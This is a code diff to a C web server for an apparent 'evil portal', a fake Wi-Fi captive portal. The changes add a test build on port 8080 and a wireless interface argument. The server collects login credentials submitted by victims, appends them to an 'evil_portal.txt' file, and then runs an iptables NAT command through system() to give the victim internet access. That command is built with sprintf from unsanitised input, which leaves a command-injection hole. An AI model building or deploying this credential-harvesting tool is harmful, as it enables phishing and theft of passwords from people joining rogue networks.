@@ -6,7 +6,12 @@
 #include <unistd.h>
 #include <signal.h>
 
+#ifdef HOST_BUILD
+#define PORT 8080
+#else
 #define PORT 80
+#endif
+
 #define BUF_SIZE 4096
 
 void serve_static_file(int client_socket, const char* filename, const char* content_type) {
@@ -50,17 +55,26 @@ void redirect_user(int client_socket) {
     send(client_socket, redirect_response, strlen(redirect_response), 0);
 }
 
-void handle_login(int client_socket, char* body, const char* client_ip) {
+void handle_login(int client_socket, char* body, const char* client_ip, const char* wlan_x) {
     char* username = NULL;
     char* password = NULL;
     char cmd[256];
 
     // You shall pass
-    sprintf(cmd, "iptables -t nat -A POSTROUTING -o $INET_NIC -s %s -j MASQUERADE", client_ip);
+    sprintf(cmd, "iptables -t nat -A POSTROUTING -o %s -s %s -j MASQUERADE", wlan_x, client_ip);
+    printf("$ %s\n", cmd);
+
+#ifndef HOST_BUILD
     system(cmd);
+#endif
 
     // Keep your shit
+#ifdef HOST_BUILD
+    FILE *file = fopen("evil_portal.txt", "a");
+#else
     FILE *file = fopen("/mnt/evil_portal.txt", "a");
+#endif
+
     if (file == NULL) {
         printf("Error opening file.\n");
         return;
@@ -105,13 +119,14 @@ void handle_signal(int signal) {
 }
 
 int main(int argc, char *argv[]) {
-    if (argc < 2) {
-        fprintf(stderr, "Usage: %s <path_to_index_html>\n", argv[0]);
+    if (argc < 3) {
+        fprintf(stderr, "Usage: %s <path_to_index_html> <wlanX>\n", argv[0]);
         return 1;
     }
     signal(SIGTERM, handle_signal);
 
     const char *html_file_path = argv[1];
+    const char *wlan_x = argv[2];
 
     int client_socket, valread;
     struct sockaddr_in address;
@@ -155,7 +170,7 @@ int main(int argc, char *argv[]) {
                 serve_html(client_socket, html_file_path);
             }
             else if (strncmp(buffer, "POST /login", 11) == 0) {
-                handle_login(client_socket, buffer, client_ip);
+                handle_login(client_socket, buffer, client_ip, wlan_x);
             }
         }
 
